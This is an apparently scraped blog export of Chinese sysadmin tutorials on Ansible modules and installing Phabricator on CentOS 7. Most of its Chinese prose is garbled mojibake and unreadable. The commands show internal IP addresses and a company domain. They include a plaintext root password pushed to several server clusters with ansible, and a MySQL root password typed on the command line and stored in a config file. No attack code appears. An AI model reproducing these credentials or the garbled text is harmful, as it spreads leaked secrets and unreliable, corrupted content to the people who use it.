æ‰€æœ‰çš„èº«ä»½éªŒè¯ä»¤ç‰Œå·²ç»æˆåŠŸæ›´æ–°ã€‚ æŸ¥çœ‹åˆ†ç»„ä¸Šæœºå™¨æ‰€æœ‰ç«¯å£ï¼š 123456789101112131415161718192021222324252627[root@salt ansible]# ansible zk1:children -m shell -a \"netstat -ntulp\"10.37.238.75 | SUCCESS | rc=0 &gt;&gt;Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:2181 0.0.0.0:* LISTEN 12497/javatcp 0 0 0.0.0.0:56521 0.0.0.0:* LISTEN 12497/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1251/sshdtcp 0 0 0.0.0.0:4888 0.0.0.0:* LISTEN 12497/javatcp 0 0 127.0.0.1:15770 0.0.0.0:* LISTEN 1434/aegis_quartzudp 0 0 118.178.240.129:123 0.0.0.0:* 1262/ntpdudp 0 0 10.27.238.75:123 0.0.0.0:* 1262/ntpdudp 0 0 127.0.0.1:123 0.0.0.0:* 1262/ntpdudp 0 0 0.0.0.0:123 0.0.0.0:* 1262/ntpd10.37.100.200 | SUCCESS | rc=0 &gt;&gt;Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:58367 0.0.0.0:* LISTEN 11232/javatcp 0 0 10.47.100.200:10050 0.0.0.0:* LISTEN 646/zabbix_agentdtcp 0 0 0.0.0.0:2181 0.0.0.0:* LISTEN 11232/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1243/sshdtcp 0 0 0.0.0.0:4888 0.0.0.0:* LISTEN 11232/javatcp 0 0 127.0.0.1:15770 0.0.0.0:* LISTEN 1436/aegis_quartzudp 0 0 120.27.152.77:123 0.0.0.0:* 1254/ntpdudp 0 0 10.47.100.200:123 0.0.0.0:* 1254/ntpdudp 0 0 127.0.0.1:123 0.0.0.0:* 1254/ntpdudp 0 0 0.0.0.0:123 0.0.0.0:* 1254/ntpd shell æ¨¡å— å¯ä»¥ç”¨çš„æœ€å¤šã€‚æŸ¥çœ‹ç›®å½•æ‰§è¡Œæ–‡ä»¶ç­‰ç­‰ã€‚ ansibleä¿®æ”¹çº¿ä¸ŠæœåŠ¡å™¨ä¸Šçš„å¯†ç  12345678910111213141516ansible cluster1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible cluster2:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible cluster3:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible zk1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible kafka1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible es1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible ihaozhuo1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible monitor1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \" 2ã€Ansible æ€»ç»“ä¸¾ä¾‹å¸¸ç”¨æ¨¡å—å­¦ä¹ 12shell &gt; ansible-doc -l # åˆ—å‡º Ansible æ”¯æŒçš„æ¨¡å—shell &gt; ansible-doc ping # æŸ¥çœ‹è¯¥æ¨¡å—å¸®åŠ©ä¿¡æ¯ è¿œç¨‹å‘½ä»¤æ¨¡å—ï¼ˆ command / raw / script / shell ï¼‰ command ä½œä¸º Ansible çš„é»˜è®¤æ¨¡å—ï¼Œå¯ä»¥è¿è¡Œè¿œç¨‹æƒé™èŒƒå›´æ‰€æœ‰çš„ shell å‘½ä»¤ï¼Œä¸æ”¯æŒç®¡é“ç¬¦ã€‚ ä¾‹ï¼š 1shell &gt; ansible Client -m command -a \"free -m\" # æŸ¥çœ‹ Client åˆ†ç»„ä¸»æœºå†…å­˜ä½¿ç”¨æƒ…å†µ rawæ¨¡å— [ç±»ä¼¼äºcommandæ¨¡å—ã€æ”¯æŒç®¡é“ä¼ é€’] ä¾‹ï¼š 1ansible Client -m raw -a \"ifconfig eth0 |sed -n 2p |awk '&#123;print \\$2&#125;' |awk -F: '&#123;print \\$2&#125;'\" script çš„åŠŸèƒ½æ˜¯åœ¨è¿œç¨‹ä¸»æœºæ‰§è¡Œä¸»æ§ç«¯å­˜å‚¨çš„ shell è„šæœ¬æ–‡ä»¶ï¼Œç›¸å½“äº scp + shell ç»„åˆã€‚ ä¾‹ï¼š 1shell &gt; ansible Client -m script -a \"/home/test.sh 12 34\" # è¿œç¨‹æ‰§è¡Œæœ¬åœ°è„šæœ¬ shell çš„åŠŸèƒ½æ˜¯æ‰§è¡Œè¿œç¨‹ä¸»æœºä¸Šçš„ shell è„šæœ¬æ–‡ä»¶ï¼Œæ”¯æŒç®¡é“ç¬¦ã€‚ ä¾‹ï¼š 1shell &gt; ansible Client -m shell -a \"/home/test.sh\" # æ‰§è¡Œè¿œç¨‹è„šæœ¬ copy æ¨¡å—ï¼ˆå®ç°ä¸»æ§ç«¯å‘ç›®æ ‡ä¸»æœºæ‹·è´æ–‡ä»¶ï¼Œç±»ä¼¼äº scp åŠŸèƒ½ï¼‰ ä¾‹ï¼š 12shell &gt; ansible Client -m copy -a \"src=/home/test.sh desc=/tmp/ owner=root group=root mode=0755\" # å‘ Client ç»„ä¸­ä¸»æœºæ‹·è´ test.sh åˆ° /tmp ä¸‹ï¼Œå±ä¸»ã€ç»„ä¸º root ï¼Œæƒé™ä¸º 0755 stat æ¨¡å—ï¼ˆè·å–è¿œç¨‹æ–‡ä»¶çŠ¶æ€ä¿¡æ¯ï¼Œatime/ctime/mtime/md5/uid/gid ç­‰ä¿¡æ¯ï¼‰ ä¾‹ï¼š 1shell &gt; ansible Client -m stat -a \"path=/etc/syctl.conf\" get_url æ¨¡å—ï¼ˆå®ç°åœ¨è¿œç¨‹ä¸»æœºä¸‹è½½æŒ‡å®š URL åˆ°æœ¬åœ°ï¼Œæ”¯æŒ sha256sum æ–‡ä»¶æ ¡éªŒï¼‰ ä¾‹ï¼š 1shell &gt; ansible Client -m get_utl -a \"url=http://www.baidu.com dest=/tmp/index.html mode=0440 force=yes\" yum æ¨¡å—ï¼ˆè½¯ä»¶åŒ…ç®¡ç†ï¼‰ ä¾‹ï¼š 1shell &gt; ansible Client -m yum -a \"name=curl state=latest\" cron æ¨¡å—ï¼ˆè¿œç¨‹ä¸»æœº crontab é…ç½®ï¼‰ ä¾‹ï¼š 123456shell &gt; ansible Client -m cron -a \"name='check dirs' hour='5,2' job='ls -alh &gt; /dev/null'\"æ•ˆæœï¼š# Ansible: check dirs* 5,2 * * * ls -alh &gt; /dev/null mount æ¨¡å—ï¼ˆè¿œç¨‹ä¸»æœºåˆ†åŒºæŒ‚è½½ï¼‰ ä¾‹ï¼š 1shell &gt; ansible Client -m mount -a \"name=/mnt/data src=/dev/sd0 fstype=ext4 opts=ro state=present\" service æ¨¡å—ï¼ˆè¿œç¨‹ä¸»æœºç³»ç»ŸæœåŠ¡ç®¡ç†ï¼‰ ä¾‹ï¼š 123shell &gt; ansible Client -m service -a \"name=nginx state=stoped\"shell &gt; ansible Client -m service -a \"name=nginx state=restarted\"shell &gt; ansible Client -m service -a \"name=nginx state=reloaded\" user æœåŠ¡æ¨¡å—ï¼ˆè¿œç¨‹ä¸»æœºç”¨æˆ·ç®¡ç†ï¼‰ ä¾‹ï¼š 12shell &gt; ansible Client -m user -a \"name=wang comment='user wang'\"shell &gt; ansible Client -m user -a \"name=wang state=absent remove=yes\" # æ·»åŠ åˆ é™¤ç”¨æˆ·","link":"/2016/03/09/è‡ªåŠ¨åŒ–+Jenkins/Ansible/ansibleå°ç»“(äº”)å¸¸ç”¨æ¨¡å—/"},{"title":"Centos7æ­å»ºé…ç½®phabricatorå¼€æºçš„å¯è§†åŒ–ä»£ç å®¡æŸ¥å·¥å…·","text":"Phabricatoræ˜¯ç”±Fackbookå¼€å‘çš„ä¸€ä¸ªå¼€æºçš„å¯è§†åŒ–ä»£ç å®¡æŸ¥å·¥å…·ã€‚å…¬å¸é¡¹ç›®ç®¡ç†å’Œä»£ç å®¡æŸ¥ä¸€ç›´ç”¨jiraå’Œgitæ¥åš,æœ€è¿‘å‘ç°ä¸€ä¸ªä¸é”™çš„å¼€æºçš„é¡¹ç›®ç®¡ç†å¹³å° è‡ªå·±æ­å»ºä¸‹æ„Ÿè§‰è¿˜æŒºå¥½ç”¨çš„è¯å°±è½¬ç§»è¿‡æ¥äº†ã€‚ ç®€ä»‹åœ¨Phabricatorä¸­ï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿çš„é’ˆå¯¹æ¯ä¸€æ®µä»£ç è¿›è¡Œäº¤é™…è®¨è®º;è´Ÿè´£å®¡æŸ¥çš„å·¥ç¨‹å¸ˆå¯ä»¥æ¥å—ä»£ç æ”¹å˜ï¼Œå¯ä»¥æå‡ºç–‘é—®è¦æ±‚åŸä½œè€…ç»§ç»­ä¿®æ”¹ç­‰ç­‰ã€‚ åœ¨Pharbricatorä¸­ï¼Œå¯ä»¥æ–°å»ºä»£ç ä»“åº“ï¼ˆä¹Ÿå°±æ˜¯åœ¨phabricatorä¸­å®¿ä¸»ä»“åº“ï¼‰ï¼Œä¹Ÿå¯ä»¥å¯¼å…¥å¤–éƒ¨ä»“åº“ï¼ˆä»å¤–éƒ¨ä»“åº“æ‹‰å–æ•°æ®ï¼Œå¹¶è·Ÿè¸ªè¯¥å¤–éƒ¨ä»“åº“ä¿æŒæ•°æ®åŒæ­¥ï¼Œphabricatorå†…éƒ¨æœ‰ä¸€ä¸ªæ›´æ–°æœºåˆ¶ï¼‰;æ”¯æŒhttp ï¼Œä¹Ÿæ”¯æŒsshï¼ˆä¸è¿‡é…ç½®æ¯”è¾ƒéº»çƒ¦ç‚¹ï¼‰; Phabricatoræ”¯æŒä¸¤ç§ä»£ç å®¡æŸ¥å·¥ä½œæµï¼šâ€œæäº¤å‰å®¡æŸ¥â€å’Œâ€œauditâ€ï¼ˆæäº¤åå®¡æŸ¥ï¼‰ã€‚ åœ¨Phabricatorçš„ä¸»é¢æ¿ä¸­ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªå·¥å…·ï¼š å·®åˆ† - å®¡æŸ¥ä»£ç ï¼šç®¡ç†é¢„æ¨ä»£ç å®¡æŸ¥å·¥ä½œæµç¨‹; Maniphest - ä»»åŠ¡å’Œé”™è¯¯ï¼šç®¡ç†æˆå‘˜çš„æ‰€æœ‰ä»»åŠ¡å’ŒBugï¼Œå¯å¯¹ä»»åŠ¡æˆ–Bugå±•å¼€è®¨è®º; Diffusion - ä¸»æœºå’Œæµè§ˆå­˜å‚¨åº“ï¼šç®¡ç†ä»£ç ä»“åº“ï¼Œæ”¯æŒGit / Hg / SVN; å®¡è®¡ - æµè§ˆå’Œå®¡è®¡æäº¤ï¼šç®¡ç†åæ¨ä»£ç å®¡æŸ¥å·¥ä½œæµç¨‹; Phriction - Wikiï¼šæ–‡æ¡£ç®¡ç†; é¡¹ç›® - ç»„ç»‡ï¼šå·¥ç¨‹ç®¡ç†ï¼Œå¯å…³è”èµ„æºåº“; æºä»£ç æ‰˜ç®¡åœ¨Github ç‰¹æ€§ï¼šä»£ç å®¡æŸ¥ï¼ˆCode Reviewï¼‰gitä»“åº“è·Ÿè¸ªbugé¡¹ç›®ç®¡ç†å›¢é˜Ÿæ²Ÿé€š å…³äºphabricatoræ›´å¤šçš„ä»‹ç»ï¼Œè®¿é—®é¡¹ç›®å®˜ç½‘ï¼šphabricator ç¯å¢ƒè¦æ±‚ï¼šPhabricatoræ˜¯ä¸€ä¸ªLAMPåº”ç”¨å¥—ä»¶ï¼Œå› æ­¤æœ€åŸºæœ¬çš„è¦æ±‚å°±æ˜¯LAMPç¯å¢ƒï¼š 123456789* Linuxç³»ç»Ÿç¯å¢ƒï¼šcentos7.1 64ä½* Apacheï¼ˆæˆ–nginxï¼Œæˆ–lighttpdï¼‰ï¼šéœ€è¦Apache 2.2.7ä»¥ä¸Šç‰ˆæœ¬ã€‚* MySQLï¼šMySQLå¿…éœ€* PHPï¼šéœ€è¦PHP5.2ä»¥ä¸Šç‰ˆæœ¬è¿™é‡Œæˆ‘å®‰è£…ç‰ˆæœ¬ï¼š* Apache 2.2.15* mysql 5.6.29* php 5.4.16 phabricatorå®‰è£…å‚è€ƒï¼šå®˜ç½‘phabricatorå®‰è£… å…·ä½“è¿‡ç¨‹ä¸æè¿°ï¼Œä»¥æˆ‘å‚è€ƒçš„ç½‘ç»œèµ„æºè¿›è¡Œè¯´æ˜ã€‚ç½‘ä¸Šçš„èµ„æºå‚è€ƒäº†ç‰¹åˆ«å¤šï¼Œåªæ”¾æˆ‘è®¤ä¸ºæœ€æœ‰å¸®åŠ©çš„ã€‚ é¦–å…ˆï¼Œphabricatoræ˜¯åŸºäºphpçš„ï¼ŒåŒæ—¶éœ€è¦å‘é€é‚®ä»¶ï¼ˆæé†’ä»£ç å®¡æŸ¥è€…ï¼‰ï¼Œæ‰€ä»¥å‡å®šæœåŠ¡å™¨ä¸Šå·²ç»é…ç½®å¥½äº†phpï¼Œmysqlï¼Œnginxï¼Œpostfixç­‰ç¯å¢ƒ;åŒæ—¶ï¼Œå®˜æ–¹æ¨èå¼€å¯APCæ€§èƒ½. ###1 å®‰è£…MariaDBæ•°æ®åº“ 1yum install mariadb mariadb-server å¯åŠ¨MariadbæœåŠ¡ï¼š 12systemctl start mariadbsystemctl enable mariadb è¿è¡ŒMySQLåˆå§‹åŒ–å®‰è£…è„šæœ¬ï¼š 1mysql_secure_installation é»˜è®¤å¯†ç ä¸ºç©ºã€‚ è¿™é‡Œéœ€è¦é…ç½®ä¼˜åŒ–my.cnf å¦‚æœé»˜è®¤ä¸ä¼˜åŒ–ä¹Ÿæ˜¯å¯ä»¥çš„ä¸è¿‡å®‰è£…å®Œæˆä»¥åå¯ä»¥çœ‹åˆ°æˆ‘ä¸‹é¢æ–‡ç« ä¼šå‡ºç°10å¤šä¸ªé—®é¢˜ å¤§éƒ¨åˆ†éƒ½æ˜¯è·ŸMySQLç›¸å…³çš„ã€‚ é…ç½®ä¼˜åŒ–MariaDBæ•°æ®åº“ï¼š1234567vim /etc/my.cnf[mysqld]innodb_buffer_pool_size = 1600Mmax_allowed_packet = \"33554432\"sql_mode=STRICT_ALL_TABLESft_stopword_file=/var/www/html/phabricator/resources/sql/stopwords.txtft_min_word_len = 3 éœ€è¦æ‰§è¡Œçš„SQLè¯­å¥ï¼š12345678910111213141516[root@Phabricator sql]# mysql -uroot -pqwde1dsdfg3.comWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 75Server version: 5.5.52-MariaDB MariaDB ServerCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MariaDB [(none)]&gt; REPAIR TABLE phabricator_search.search_documentfield;+-----------------------------------------+--------+----------+----------+| Table | Op | Msg_type | Msg_text |+-----------------------------------------+--------+----------+----------+| phabricator_search.search_documentfield | repair | status | OK |+-----------------------------------------+--------+----------+----------+1 row in set (0.00 sec) mysql 5.6å®‰è£…ï¼Œä¸è¿‡è¿™é‡Œæˆ‘æœ€åå¯ç”¨çš„æ˜¯5.6ç‰ˆæœ¬ï¼ŒåŸå› å·²ç»è¯´æ˜äº†. 2 å®‰è£…Apache1ï¼ƒyum -y install httpd é…ç½®Apacheï¼Œæé«˜ä¸€ç‚¹å®‰å…¨æ€§ï¼š 12sed -i 's/^/#&amp;/g' /etc/httpd/conf.d/welcome.conf # æ³¨é‡Šæ‰æ¯ä¸€è¡Œsed -i \"s/Options Indexes FollowSymLinks/Options FollowSymLinks/\" /etc/httpd/conf/httpd.conf å¯åŠ¨Apache webæœåŠ¡ï¼š 12systemctl start httpdsystemctl enable httpd 3 å®‰è£…PHPå’Œä¸€äº›æ¨¡å—1yum install php php-mysqli php-mbstring php-gd php-curl php-cli php-common php-process é…ç½®ä¼˜åŒ– ä¸ç„¶å®‰è£…æˆåŠŸä»¥åä¼šå‡ºç°é—®é¢˜é”™è¯¯æç°âŒï¼š 12345678910111. æœªé…ç½®æœåŠ¡å™¨æ—¶åŒº [root@Phabricator sql]# vim /etc/php.iniä¾‹ ;date.timezone = æ”¹æˆ: date.timezone = Asia/Shanghai PHP post_max_sizeæœªé…ç½® å°†PHP é…ç½®ä¸­çš„post_max_size è°ƒæ•´ä¸ºè‡³å°‘32MBã€‚è®¾ç½®ä¸ºè¾ƒå°å€¼æ—¶ï¼Œå¤§æ–‡ä»¶ä¸Šä¼ å¯èƒ½æ— æ³•æ­£å¸¸å·¥ä½œã€‚post_max_size = 32M php5.4ç‰ˆæœ¬å¯ä»¥ç›´æ¥ä½¿ç”¨phabricator.shæä¾›çš„è„šæœ¬å®‰è£…ï¼Œè¿™ä¸ªè„šæœ¬ä¼šæ£€æŸ¥phabricatoréœ€è¦çš„ç¯å¢ƒï¼Œæ²¡æœ‰çš„ä¼šè‡ªåŠ¨å®‰è£…ï¼Œä¹‹åä¼šå®‰è£…å¥½phabricatorï¼Œå®‰è£…å‚è€ƒphabricatorå®‰è£…å‘å¯¼. 4 å®‰è£…Git1yum install git å¯å‚è€ƒç½‘ä¸Šé˜²ç«å¢™å’Œselinuxå»ºè®®æ ¹æ®æ­¤æ–‡ç« é…ç½®ä¸€ä¸‹. å¦‚æœä½ å·²ç»è®¾ç½®å¥½LAMPç¯å¢ƒï¼Œä½ å¯ä»¥å·²ç»è·å¾—ä½ æ‰€éœ€çš„ä»»ä½•ä¸œä¸œã€‚å¦‚ä½•å®‰è£…LAMPå¯ä»¥æŸ¥çœ‹æˆ‘å†™yumä¸€é”®å®‰è£…ä¸å¸è½½LAMPç¯å¢ƒ 5 ä¸‹è½½å®‰è£…Phabricatoræ—¢ç„¶ä½ å·²ç»å®‰è£…ä»¥ä¸Šæ‰€éœ€çš„ä¾èµ–ç¯å¢ƒæœåŠ¡ï¼Œä¸‹é¢è·å–Phabricatorä»¥åŠå…¶ä¾èµ–åŒ…ï¼š 123456mkdir /var/www/html/cd /var/www/html/git clone https://github.com/phacility/libphutil.gitgit clone https://github.com/phacility/arcanist.gitgit clone https://github.com/phacility/phabricator.gitchown -R apache: /var/www/html/* 6 åˆ›å»ºApacheè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶1vim /etc/httpd/conf.d/phabricator.conf å†™å…¥å†…å®¹ï¼š 123456789101112131415&lt;VirtualHost *:80&gt; ServerAdmin phabricator.ihaozhuo.com DocumentRoot /var/www/html/phabricator/webroot/ ServerName phabricator.ihaozhuo.com ServerAlias phabricator.ihaozhuo.com RewriteEngine on RewriteRule ^/rsrc/(.*) - [L,QSA] RewriteRule ^/favicon.ico - [L,QSA] RewriteRule ^(.*)$ /index.php?__path__=$1 [B,L,QSA] &lt;Directory /var/www/html/phabricator/webroot/&gt; AllowOverride All &lt;/Directory&gt; ErrorLog /var/log/httpd/phabricator.ihaozhuo.com-error_log CustomLog /var/log/httpd/phabricator.ihaozhuo.com-access_log common&lt;/VirtualHost&gt; â—ï¸â—ï¸æ³¨æ„æ›¿æ¢ä¸Šé¢çš„åŸŸåã€‚å…¶ä¸­/var/www/html/phabricator/webrootæ˜¯æˆ‘çš„phabricatorå®‰è£…è·¯å¾„ï¼Œå¤§å®¶ä½¿ç”¨æ—¶å€™æ¢æˆè‡ªå·±çš„å³å¯ã€‚å®‰è£…å¥½phabricatorä¹‹åï¼Œéœ€è¦ä½¿ç”¨phabricatorå®‰è£…ç›®å½•ä¸‹binæ–‡ä»¶å¤¹ä¸‹çš„å‘½ä»¤æ¥æ›´æ–°ä¸‹. é‡å¯apacheæœåŠ¡ï¼š1systemctl restart httpd 7 è®¾ç½®MariaDBæ•°æ®åº“é…ç½®Phabricatorè¿æ¥MariaDBéœ€è¦çš„ä¿¡æ¯ï¼š 12345cd /var/www/html/phabricator/./bin/config set mysql.host localhost ./bin/config set mysql.port 3306./bin/config set mysql.user root./bin/config set mysql.pass &lt;your-MySQL-root-password&gt; åˆ›å»ºæ•°æ®åº“ï¼šå‡ºç°é—®é¢˜ï¼š 123456789101112131415161718[root@phabricator bin]# ./storage upgradeMySQL Credentials Not ConfiguredUnable to connect to MySQL using the configured credentials. You mustconfigure standard credentials before you can upgrade storage. Run thesecommands to set up credentials: phabricator/ $ ./bin/config set mysql.host __host__ phabricator/ $ ./bin/config set mysql.user __username__ phabricator/ $ ./bin/config set mysql.pass __password__These standard credentials are separate from any administrative credentialsprovided to this command with __--user__ or __--password__, and must beconfigured correctly before you can proceed.Raw MySQL Error: Attempt to connect to root@localhost failed with error#2002: Can't connect to local MySQL server through socket'/var/lib/mysql/mysql.sock' (2). å‡ºç°è¿™ä¸€æ­¥é—®é¢˜ å°±æ˜¯å› ä¸ºæ²¡æœ‰é…ç½®å¥½MySQLçš„è¿æ¥åœ°å€ä¿¡æ¯ã€‚é…ç½®ä¸‹mysqlçš„userå’Œpasså°±è¡Œã€‚ 1234567[root@Phabricator local]# cat /var/www/html/phabricator/conf/local/local.json&#123; \"mysql.pass\": \"qwde1dsdfg3.com\", \"mysql.user\": \"root\", \"mysql.port\": \"3306\", \"mysql.host\": \"localhost\"&#125; é‡æ–°åˆå§‹åŒ–æ•°æ®åº“ï¼š12345678910111213141516171819202122232425[root@Phabricator phabricator]# ./bin/storage upgradeBefore running storage upgrades, you should take down the Phabricator webinterface and stop any running Phabricator daemons (you can disable thiswarning with --force). Are you ready to continue? [y/N] yLoading quickstart template onto \"localhost:3306\"...Applying patch \"phabricator:db.packages\" to host \"localhost:3306\"...Applying patch \"phabricator:20160201.revision.properties.1.sql\" to host \"localhost:3306\"...Applying patch \"phabricator:20160201.revision.properties.2.sql\" to host \"localhost:3306\"...Applying patch \"phabricator:20160706.phame.blog.parentdomain.2.sql\" to host \"localhost:3306\"...Applying patch \"phabricator:20160706.phame.blog.parentsite.1.sql\" to host \"localhost:3306\"...Applying patch \"phabricator:20160707.calendar.01.stub.sql\" to host \"localhost:3306\"...Applying patch \"phabricator:20160711.files.01.builtin.sql\" to host \"localhost:3306\".............Missing Keyphabricator_search search_documentfield corpus Surplus Keyphabricator_search search_documentfield key_corpus Missing Keyphabricator_worker worker_archivetask key_modified Missing KeyApplying schema adjustments...Done.Completed applying all schema adjustments. 8 æŸ¥çœ‹æ•°æ®åº“ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142[root@Phabricator phabricator]# mysql -uroot -pqwde1dsdfg3.comWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 177Server version: 5.5.52-MariaDB MariaDB ServerCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MariaDB [(none)]&gt; show databases;+--------------------------+| Database |+--------------------------+| information_schema || mysql || performance_schema || phabricator_almanac || phabricator_audit || phabricator_auth || phabricator_badges || phabricator_cache || phabricator_calendar || phabricator_chatlog || phabricator_conduit || phabricator_config || phabricator_conpherence || phabricator_countdown || phabricator_daemon || phabricator_dashboard || phabricator_differential || phabricator_diviner || phabricator_doorkeeper || phabricator_draft || phabricator_drydock || phabricator_fact || phabricator_feed || phabricator_file || phabricator_flag || phabricator_fund || ....... |+--------------------------+61 rows in set (0.01 sec) â—ï¸â—ï¸æ³¨ï¼šupgradeä¹‹åï¼Œshow databasesä½ ä¼šå‘ç°å»ºç«‹äº†è®¸å¤šphabrictorå¼€å¤´çš„æ•°æ®åº“ã€‚ ###8.1 é…ç½®URLï¼š æœªé…ç½®æ­¤å®‰è£…çš„åŸºæœ¬URIï¼Œå¹¶ä¸”åœ¨é…ç½®ä¹‹å‰ï¼Œä¸»è¦åŠŸèƒ½å°†æ— æ³•æ­£å¸¸å·¥ä½œã€‚æ‚¨åº”è¯¥å°†åŸºæœ¬URIè®¾ç½®ä¸ºæ‚¨å°†ç”¨äºè®¿é—®Phabricatorçš„URIï¼Œå¦‚â€œhttp://phabricator.example.com/â€ã€‚å¦‚æœä½¿ç”¨çš„ç«¯å£ä¸æ˜¯80ï¼ˆhttpï¼‰æˆ–443ï¼ˆhttpsï¼‰ï¼Œè¯·åŒ…æ‹¬åè®®ï¼ˆhttpæˆ–httpsï¼‰ï¼ŒåŸŸåå’Œç«¯å£å·ã€‚åŸºäºæ­¤è¯·æ±‚ï¼Œæ­£ç¡®çš„è®¾ç½®ä¼¼ä¹æ˜¯ï¼šhttp : //phabricator.ihaozhuo.com/è¦é…ç½®åŸºæœ¬URIï¼Œè¯·è¿è¡Œä»¥ä¸‹å‘½ä»¤ã€‚ 12[root@Phabricator phabricator]# ./bin/config set phabricator.base-uri 'http://phabricator.ihaozhuo.com/'Set 'phabricator.base-uri' in local configuration. 9 è®¾ç½®é˜²ç«å¢™12firewall-cmd --zone=public --permanent --add-service=httpfirewall-cmd --reload 9.1 Phabricator Daemons Are Not Runningå¯åŠ¨å®ˆæŠ¤è¿›ç¨‹1phabricator/ $ ./bin/phd start 10 å®Œæˆå®‰è£…é…ç½®phabricatorï¼š 123cd /var/www/html/phabricator/./bin/config set phabricator.base-uri 'http://your_domain_or_IP'./bin/phd start ä½¿ç”¨æµè§ˆå™¨è®¿é—®ï¼šhttp://your_domain_or_IP ç„¶åæ ¹æ®æç¤ºä¿®å¤ä¸€äº›é—®é¢˜ã€‚ ç™»å½•è¿›æ¥ç®¡ç†ç•Œé¢ï¼š åˆ›å»ºé¡¹ç›®ä¾‹å­ï¼š Projects â€”â€”ã€‹ Create Project â€”â€”ã€‹å¡«å†™å¥½é¡¹ç›®åç§° â€”â€”ã€‹Create New Project åˆ›å»ºå®Œæˆæ•ˆæœï¼š å®‰è£…å®Œæˆä»¥åå‡ºç°10å¤šä¸ªé—®é¢˜è§£å†³ï¼šæ±‰åŒ–ç¿»è¯‘è¿‡æ¥ï¼š â“è¯´æ˜ï¼šæŒ‰é—®é¢˜æç¤ºæ“ä½œè§£å†³æ•…éšœã€‚ä¸€èˆ¬éƒ½æœ‰é—®é¢˜ä¿®å¤è§£å†³æ–¹æ³•çš„ï¼Œå®˜æ–¹è¿™ç‚¹è¿˜æ˜¯å¾ˆä¸é”™çš„ã€‚ æ£˜æ‰‹é—®é¢˜1 å¦‚æœé‡åˆ°è¿™ä¸ªé—®é¢˜ï¼šAlternate File Domain Not Configured æ“ä½œäº†è¿™æ¡å‘½ä»¤å¤±æ•ˆ æœ€å¥½åˆ«æ“ä½œï¼š 123phabricator/ $ ./bin/config set security.alternate-file-domain &lt;domain&gt;[root@Phabricator phabricator]# ./bin/config set security.alternate-file-domain http://cdn.phabricator.com å¦‚æœæ˜¯CDNæ•°æ®å­˜æ”¾å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤ã€‚ä¸ç„¶ä¼šå‡ºç°è®¿é—®å¤±è´¥ã€‚æˆ‘æ˜¯å‚è€ƒè¿™ç¯‡æ–‡æ¡£è§£å†³é—®é¢˜ï¼šPhabricator not rendering resources over httpsåˆ é™¤security.alternate-file-domainå¯ä»¥è®¿é—®ã€‚ æ£˜æ‰‹é—®é¢˜2 PHP Extension â€˜APCâ€™ Not Installed å‚è€ƒæ–‡ç« ï¼šPHP Extension â€˜APCâ€™ Not Installed 123456# yum install php-pear# pecl install apc# echo \"extension=apc.so\" &gt;&gt; /etc/php.ini# echo \"apc.enabled=1\" &gt;&gt; /etc/php.ini# cp /usr/share/pear/apc.php /var/www/html/apc.php (this step is optional)# /etc/init.d/httpd restart phabricatorå®˜ç½‘é…ç½®è¯´æ˜Configuration Guide 1. èº«ä»½éªŒè¯æä¾›è€…Phabricatorç™»å½•çš„æ–¹æ³•è¢«ç§°ä¸ºèº«ä»½éªŒè¯æä¾›è€…ï¼ˆAuthentication Providersï¼‰ã€‚ä¾‹å¦‚,å½“æˆ‘ä»¬è®¾ç½®äº†ä¸€ä¸ªâ€ç”¨æˆ·å/å¯†ç â€èº«ä»½éªŒè¯æä¾›è€…,é‚£ä¹ˆç”¨æˆ·å¯ä»¥é€šè¿‡ä¼ ç»Ÿçš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•ã€‚Phabricatoræ”¯æŒå¤šç§ç™»å½•ç³»ç»Ÿã€‚å½“æˆ‘ä»¬ä½¿ç”¨Administratorsç™»å½•åˆ°åå°ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯ç”¨æˆ–ç¦ç”¨è¿™äº›Providersï¼Œé…ç½®ç”¨æˆ·å¦‚ä½•æ³¨å†Œæˆ–ç™»å½•åˆ°Phabricatorã€‚ åœ¨å…¬å¸å†…éƒ¨ä½¿ç”¨ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨Username/Passwordæˆ–LDAPï¼Œå¯¹äºå¼€æºé¡¹ç›®ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ç±»ä¼¼äºGitHubç­‰OAuthç¬¬ä¸‰æ–¹ç™»å½•ã€‚åœ¨ä½¿ç”¨Username/Passwordç™»å½•æ–¹å¼æ—¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é™åˆ¶æ³¨å†Œç”¨æˆ·æ—¶çš„é‚®ç®±åç¼€ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®æˆå…¬å¸çš„é‚®ç®±åŸŸåã€‚ 1.1 